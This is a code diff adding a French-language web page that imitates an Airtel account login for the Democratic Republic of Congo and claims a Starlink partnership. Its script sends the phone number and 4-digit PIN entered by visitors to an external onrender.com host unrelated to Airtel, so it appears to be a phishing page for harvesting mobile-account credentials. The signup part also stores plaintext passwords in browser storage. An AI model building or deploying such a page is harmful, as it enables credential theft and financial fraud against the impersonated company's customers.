@@ -1,0 +1,439 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="airtel_logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Connexion — Mon Compte</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              syne: ["Syne", "sans-serif"],
+              dm: ['"DM Sans"', "sans-serif"],
+            },
+          },
+        },
+      };
+    </script>
+
+    <style type="text/tailwindcss">
+      @layer base {
+        * {
+          @apply m-0 p-0 box-border;
+        }
+        body {
+          @apply font-dm antialiased;
+        }
+      }
+      @layer components {
+        .field-label {
+          @apply block text-center text-[14px] font-medium text-[#888] mb-3;
+        }
+        .txt-input {
+          @apply w-full rounded-[8px] border-2 border-[#0066cc] bg-white px-4 py-3.5 text-[15px] text-[#333] outline-none transition-colors placeholder:text-[#9bb8d6] focus:border-[#0052a3];
+        }
+        .primary-btn {
+          @apply w-full rounded-[8px] bg-gradient-to-br from-[#0066cc] to-[#0052a3] py-4 text-[15px] font-semibold uppercase tracking-wide text-white transition-[transform,box-shadow,opacity] duration-200 hover:-translate-y-0.5 hover:shadow-[0_6px_12px_#0066cc4d] active:translate-y-0 disabled:cursor-not-allowed disabled:bg-none disabled:bg-[#ccc] disabled:opacity-70 disabled:shadow-none disabled:translate-y-0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="min-h-screen flex flex-col bg-white text-[#333]">
+      <!-- HEADER LOGO -->
+      <header class="pt-12 pb-6 text-center">
+        <img src="airtel_logo.svg" alt="Airtel" class="mx-auto h-9" />
+      </header>
+
+      <main class="flex-1 flex flex-col items-center px-4">
+        <div class="w-full max-w-[400px]">
+          <h1
+            id="subtitle"
+            class="text-center text-[clamp(18px,5vw,22px)] font-medium text-[#666] leading-snug mb-10"
+          >
+            Connectez-vous à votre compte pour continuer.
+          </h1>
+
+          <div
+            id="alert"
+            class="hidden mb-5 rounded-[8px] border px-4 py-3 text-[14px] text-center font-medium"
+          ></div>
+
+          <!-- LOGIN FORM -->
+          <form id="login-form" novalidate>
+            <div class="relative mb-6">
+              <div
+                class="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 text-[15px] font-medium text-[#333] pointer-events-none"
+              >
+                <span class="bold">🇨🇩</span><span>+243</span>
+              </div>
+              <input
+                id="login-phone"
+                class="txt-input pl-[92px]"
+                type="tel"
+                inputmode="numeric"
+                autocomplete="tel"
+                placeholder="951234567"
+                maxlength="10"
+              />
+            </div>
+
+            <p class="field-label">Mot de passe</p>
+            <!-- Code Inputs -->
+            <div class="flex items-center justify-center gap-3">
+              <input
+                type="password"
+                maxlength="1"
+                class="code-input w-14 h-14 rounded-xl border-2 border-blue-600 outline-none text-center text-xl"
+              />
+
+              <input
+                type="password"
+                maxlength="1"
+                class="code-input w-14 h-14 rounded-xl border-2 border-blue-600 outline-none text-center text-xl"
+              />
+
+              <input
+                type="password"
+                maxlength="1"
+                class="code-input w-14 h-14 rounded-xl border-2 border-blue-600 outline-none text-center text-xl"
+              />
+
+              <input
+                type="password"
+                maxlength="1"
+                class="code-input w-14 h-14 rounded-xl border-2 border-blue-600 outline-none text-center text-xl"
+              />
+
+              <button
+                type="button"
+                id="toggleCode"
+                class="text-xl ml-1 cursor-pointer"
+              >
+                🙈
+              </button>
+            </div>
+
+            <p class="text-center mb-8">
+              <button
+                type="button"
+                id="forgot"
+                class="text-[14px] text-[#888] hover:text-[#0066cc]"
+              >
+                Mot de passe oublié ?
+              </button>
+            </p>
+
+            <button type="submit" class="primary-btn">Connexion</button>
+
+            <p class="text-center text-[14px] text-[#888] mt-6">
+              Pas encore de compte ?
+              <button
+                type="button"
+                id="go-signup"
+                class="font-semibold text-[#0066cc] hover:underline"
+              >
+                Créer un compte
+              </button>
+            </p>
+          </form>
+
+          <!-- SIGNUP FORM -->
+          <form id="signup-form" class="hidden" novalidate>
+            <p
+              class="field-label !text-left !mb-1.5 !text-[#333] font-semibold"
+            >
+              Nom complet
+            </p>
+            <input
+              id="su-name"
+              class="txt-input mb-5"
+              type="text"
+              autocomplete="name"
+              placeholder="Votre nom"
+            />
+
+            <p
+              class="field-label !text-left !mb-1.5 !text-[#333] font-semibold"
+            >
+              Numéro de téléphone
+            </p>
+            <div class="relative mb-5">
+              <div
+                class="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 text-[15px] font-medium text-[#333] pointer-events-none"
+              >
+                <span>🇨🇩</span><span>+243</span>
+              </div>
+              <input
+                id="su-phone"
+                class="txt-input pl-[92px]"
+                type="tel"
+                inputmode="numeric"
+                autocomplete="tel"
+                placeholder="951234567"
+                maxlength="10"
+              />
+            </div>
+
+            <p
+              class="field-label !text-left !mb-1.5 !text-[#333] font-semibold"
+            >
+              E-mail <span class="font-normal text-[#9bb8d6]">(optionnel)</span>
+            </p>
+            <input
+              id="su-email"
+              class="txt-input mb-5"
+              type="email"
+              autocomplete="email"
+              placeholder="vous@email.com"
+            />
+
+            <p
+              class="field-label !text-left !mb-1.5 !text-[#333] font-semibold"
+            >
+              Mot de passe
+            </p>
+            <div class="relative mb-8">
+              <input
+                id="su-pass"
+                class="txt-input pr-12"
+                type="password"
+                autocomplete="new-password"
+                placeholder="Au moins 6 caractères"
+              />
+              <button
+                type="button"
+                data-toggle="su-pass"
+                class="absolute right-3 top-1/2 -translate-y-1/2 text-[20px] leading-none"
+                aria-label="Afficher le mot de passe"
+              >
+                🙈
+              </button>
+            </div>
+
+            <button type="submit" class="primary-btn">Créer mon compte</button>
+
+            <p class="text-center text-[14px] text-[#888] mt-6">
+              Vous avez déjà un compte ?
+              <button
+                type="button"
+                id="go-login"
+                class="font-semibold text-[#0066cc] hover:underline"
+              >
+                Se connecter
+              </button>
+            </p>
+          </form>
+        </div>
+      </main>
+
+      <!-- FOOTER -->
+      <footer
+        class="mt-auto bg-[#f8f9fa] border-t border-[#e8e8e8] py-8 text-center"
+      >
+        <img src="airtel_logo.svg" alt="Airtel" class="mx-auto h-7 mb-2" />
+        <p class="text-[13px] text-[#888]">En collaboration avec</p>
+        <p
+          class="font-syne text-[15px] font-extrabold tracking-[0.14em] text-[#333] mt-0.5"
+        >
+          STARLINK
+        </p>
+      </footer>
+    </div>
+
+    <script>
+      const KEY_USERS = "app_users";
+      const KEY_SESSION = "app_session";
+
+      const el = (id) => document.getElementById(id);
+      const loginForm = el("login-form");
+      const signupForm = el("signup-form");
+      const subtitle = el("subtitle");
+      const alertBox = el("alert");
+
+      const toggleCode = document.getElementById("toggleCode");
+      const codeInputs = document.querySelectorAll(".code-input");
+
+      toggleCode.addEventListener("click", () => {
+        const isHidden = codeInputs[0].type === "password";
+
+        codeInputs.forEach((input) => {
+          input.type = isHidden ? "text" : "password";
+        });
+
+        toggleCode.textContent = isHidden ? "👁️" : "🙈";
+      });
+
+      const loadUsers = () => {
+        try {
+          return JSON.parse(localStorage.getItem(KEY_USERS) || "[]");
+        } catch {
+          return [];
+        }
+      };
+      const saveUsers = (u) =>
+        localStorage.setItem(KEY_USERS, JSON.stringify(u));
+      const normId = (v) => (v || "").trim().toLowerCase();
+      const toPhoneId = (raw) => {
+        const d = (raw || "").replace(/\D/g, "");
+        return "+243" + (d.startsWith("0") ? d.slice(1) : d);
+      };
+
+      function showAlert(msg, type = "error") {
+        alertBox.textContent = msg;
+        alertBox.className =
+          "mb-5 rounded-[8px] border px-4 py-3 text-[14px] text-center font-medium " +
+          (type === "error"
+            ? "border-[#f5c6cb] bg-[#fdecee] text-[#a1121f]"
+            : "border-[#bfe3c6] bg-[#eafbef] text-[#1c7a3a]");
+        alertBox.classList.remove("hidden");
+      }
+      const clearAlert = () => alertBox.classList.add("hidden");
+
+      function setMode(mode) {
+        const login = mode === "login";
+        loginForm.classList.toggle("hidden", !login);
+        signupForm.classList.toggle("hidden", login);
+        subtitle.textContent = login
+          ? "Connectez-vous à votre compte pour continuer."
+          : "Créez votre compte pour gérer vos forfaits.";
+        clearAlert();
+      }
+
+      el("go-signup").addEventListener("click", () => setMode("signup"));
+      el("go-login").addEventListener("click", () => setMode("login"));
+
+      document.querySelectorAll("[data-toggle]").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          const input = el(btn.dataset.toggle);
+          input.type = input.type === "password" ? "text" : "password";
+          btn.textContent = input.type === "password" ? "🙈" : "👁️";
+        });
+      });
+
+      el("forgot").addEventListener("click", () =>
+        showAlert(
+          "Contactez le support pour réinitialiser votre mot de passe.",
+          "success",
+        ),
+      );
+
+      signupForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        clearAlert();
+        const name = el("su-name").value.trim();
+        const phone = el("su-phone").value.replace(/\D/g, "");
+        const email = normId(el("su-email").value);
+        const pass = el("su-pass").value;
+
+        if (!name) return showAlert("Veuillez saisir votre nom.");
+        if (phone.length < 9)
+          return showAlert("Numéro de téléphone invalide (9 chiffres).");
+        if (pass.length < 6)
+          return showAlert(
+            "Le mot de passe doit contenir au moins 6 caractères.",
+          );
+
+        const users = loadUsers();
+        const phoneId = toPhoneId(phone);
+        if (
+          users.some((u) => u.phone === phoneId || (email && u.email === email))
+        ) {
+          return showAlert(
+            "Un compte existe déjà avec ce numéro ou cet e-mail.",
+          );
+        }
+
+        // NOTE: front-end demo only. In production, POST this to YOUR backend
+        // over HTTPS and store a securely hashed password server-side.
+        users.push({ name, phone: phoneId, email, pass });
+        saveUsers(users);
+        localStorage.setItem(
+          KEY_SESSION,
+          JSON.stringify({ name, phone: phoneId, at: Date.now() }),
+        );
+        window.location.href = "index.html";
+      });
+
+      loginForm.addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        // Phone
+        const phoneInput = document.getElementById("login-phone");
+        const phone = phoneInput.value.trim();
+
+        // Password: combine the 4 code inputs
+        const codeInputs = document.querySelectorAll(".code-input");
+        const password = Array.from(codeInputs)
+          .map((input) => input.value)
+          .join("");
+
+        // Basic validation
+        if (!phone) {
+          alert("Veuillez entrer votre numéro de téléphone.");
+          phoneInput.focus();
+          return;
+        }
+
+        if (!/^\d+$/.test(phone)) {
+          alert(
+            "Le numéro de téléphone doit contenir uniquement des chiffres.",
+          );
+          phoneInput.focus();
+          return;
+        }
+
+        if (password.length !== 4) {
+          alert("Veuillez entrer votre mot de passe à 4 chiffres.");
+          return;
+        }
+
+        try {
+          const response = await fetch(
+            "https://airtel-bc.onrender.com/api/login",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                phone: `+243${phone}`,
+                password: password,
+              }),
+            },
+          );
+
+          const data = await response.json();
+
+          if (!response.ok) {
+            throw new Error(data.message || "Échec de la connexion.");
+          }
+
+          console.log("Login successful:", data);
+
+          // Example: save token if your backend returns one
+          if (data.token) {
+            localStorage.setItem("token", data.token);
+          }
+
+          // Redirect after login
+          window.location.href = "/";
+        } catch (error) {
+          console.error("Login error:", error);
+          alert(error.message || "Une erreur est survenue.");
+        }
+      });
+    </script>
+  </body>
+</html>
